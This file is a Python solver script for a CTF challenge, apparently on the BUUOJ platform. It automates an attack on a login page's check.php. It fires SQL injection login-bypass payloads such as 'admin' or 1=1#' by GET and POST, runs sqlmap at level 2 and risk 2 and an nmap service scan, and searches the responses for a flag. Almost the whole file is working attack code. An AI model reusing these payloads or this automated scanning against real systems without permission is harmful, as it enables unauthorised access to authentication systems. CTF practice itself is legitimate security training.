#!/usr/bin/env python3

import asyncio
import aiohttp
import re 
import subprocess
import json
import os
from datetime import datetime


class CTFSolver:
    """CTF挑战求解器"""
    
    def __init__(self):
        self.target_url = "http://20bfb079-5070-4c15-9a3e-f82f9c100afd.node5.buuoj.cn:81/check.php"
        self.base_url = "http://20bfb079-5070-4c15-9a3e-f82f9c100afd.node5.buuoj.cn:81"
        self.session = None
        self.flag = None
    
    async def initialize(self):
        """初始化"""
        if not self.session:
            self.session = aiohttp.ClientSession()
    
    async def close(self):
        """关闭"""
        if self.session:
            await self.session.close()
    
    def detect_flag(self, text: str) -> str:
        """从文本中检测flag"""
        flag_patterns = [
            r'flag\{[^}]+\}',
            r'FLAG\{[^}]+\}',
            r'ctf\{[^}]+\}',
            r'CTF\{[^}]+\}',
        ]
        
        for pattern in flag_patterns:
            match = re.search(pattern, text)
            if match:
                return match.group()
        
        return None
    
    async def test_universal_password(self):
        """测试万能密码注入"""
        payloads = [
            {"username": "admin'--", "password": ""},
            {"username": "admin'#", "password": ""},
            {"username": "admin' or 1=1#", "password": ""},
        ]
        
        for payload in payloads:
            # GET请求
            async with self.session.get(self.target_url, params=payload) as response:
                text = await response.text()
                flag = self.detect_flag(text)
                
                if flag:
                    self.flag = flag
                    return {
                        "method": "GET",
                        "payload": payload,
                        "flag": flag,
                        "status": response.status,
                        "response_text": text[:200] if len(text) > 200 else text
                    }
            
            # POST请求
            async with self.session.post(self.target_url, data=payload) as response:
                text = await response.text()
                flag = self.detect_flag(text)
                
                if flag:
                    self.flag = flag
                    return {
                        "method": "POST",
                        "payload": payload,
                        "flag": flag,
                        "status": response.status,
                        "response_text": text[:200] if len(text) > 200 else text
                    }
        
        # 如果没有找到flag，返回None
        return None
    
    def run_sqlmap(self):
        """运行sqlmap扫描"""
        # 创建输出目录
        output_dir = "sqlmap_results"
        os.makedirs(output_dir, exist_ok=True)
        
        # sqlmap命令
        cmd = f"sqlmap -u \"{self.target_url}?username=test&password=test\" --batch --level=2 --risk=2"
        
        try:
            process = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=120
            )
            
            # 保存输出
            output_file = f"{output_dir}/sqlmap_scan.txt"
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(f"命令: {cmd}\n")
                f.write(f"返回码: {process.returncode}\n")
                f.write(f"标准输出:\n{process.stdout}\n")
                f.write(f"标准错误:\n{process.stderr}\n")
            
            # 检查输出中是否有flag
            flag = self.detect_flag(process.stdout)
            
            return {
                "command": cmd,
                "returncode": process.returncode,
                "output_file": output_file,
                "injectable": "injectable" in process.stdout.lower(),
                "flag_found": flag is not None,
                "flag": flag
            }
            
        except subprocess.TimeoutExpired:
            return {"timeout": True}
        except Exception as e:
            return {"error": str(e)}
    
    def run_nmap(self):
        """运行nmap扫描"""
        # 提取主机
        host = self.base_url.replace("http://", "").split("/")[0]
        
        # 创建输出目录
        output_dir = "nmap_results"
        os.makedirs(output_dir, exist_ok=True)
        
        # nmap命令
        cmd = f"nmap -sV -p 81 {host}"
        
        try:
            process = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            # 保存输出
            output_file = f"{output_dir}/nmap_scan.txt"
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(f"命令: {cmd}\n")
                f.write(f"返回码: {process.returncode}\n")
                f.write(f"标准输出:\n{process.stdout}\n")
                f.write(f"标准错误:\n{process.stderr}\n")
            
            return {
                "command": cmd,
                "returncode": process.returncode,
                "output_file": output_file
            }
            
        except subprocess.TimeoutExpired:
            return {"timeout": True}
        except Exception as e:
            return {"error": str(e)}
    
    async def solve(self):
        """解决CTF挑战"""
        await self.initialize()
        
        try:
            print("="*60)
            print("CTF挑战解决方案")
            print(f"目标: {self.target_url}")
            print(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            print("="*60)
            
            # 1. 万能密码注入测试
            print("\n1. 测试万能密码注入...")
            result = await self.test_universal_password()
            
            if result and result.get("flag"):
                self.flag = result["flag"]
                print(f"   ✅ 找到flag: {self.flag}")
                print(f"   ⚡ 利用方法: {result['payload']['username']} ({result['method']})")
            else:
                print("   ❌ 未找到flag")
                # 继续测试其他方法
            
            # 2. sqlmap扫描
            print("\n2. 运行sqlmap扫描...")
            sqlmap_result = self.run_sqlmap()
            
            if sqlmap_result.get("flag_found"):
                self.flag = sqlmap_result.get("flag")
                print(f"   ✅ sqlmap找到flag: {self.flag}")
            elif sqlmap_result.get("injectable"):
                print("   ✅ sqlmap确认SQL注入漏洞存在")
            else:
                print("   ❌ sqlmap未发现漏洞")
            
            # 3. nmap扫描
            print("\n3. 运行nmap扫描...")
            nmap_result = self.run_nmap()
            
            if nmap_result.get("returncode") == 0:
                print("   ✅ nmap扫描完成")
            else:
                print("   ❌ nmap扫描失败")
            
            # 输出最终结果
            print("\n" + "="*60)
            print("最终结果")
            print("="*60)
            
            if self.flag:
                print(f"🎉 Flag: {self.flag}")
                print(f"🔓 漏洞: SQL注入（万能密码）")
                print(f"🎯 目标: {self.target_url}")
            else:
                print("❌ 未找到flag")
                print("⚠️  可能原因:")
                print("   - flag不在响应体中")
                print("   - 需要其他利用方法")
                print("   - 目标服务器已关闭")
            
            # 保存结果
            final_result = {
                "target": self.target_url,
                "flag": self.flag,
                "vulnerability": "SQL Injection (Universal Password)" if self.flag else "Unknown",
                "timestamp": datetime.now().isoformat(),
                "sqlmap": sqlmap_result,
                "nmap": nmap_result
            }
            
            if result:
                final_result["exploit"] = f"{result.get('payload', {}).get('username', '')} ({result.get('method', '')})"
            
            with open("ctf_solution.json", "w", encoding="utf-8") as f:
                json.dump(final_result, f, indent=2, ensure_ascii=False)
            
            print(f"\n结果已保存到: ctf_solution.json")
            
            return final_result
            
        finally:
            await self.close()


async def main():
    """主函数"""
    solver = CTFSolver()
    result = await solver.solve()
    
    if result.get("flag"):
        return 0
    else:
        return 1


if __name__ == "__main__":
    exit_code = asyncio.run(main())
    exit(exit_code)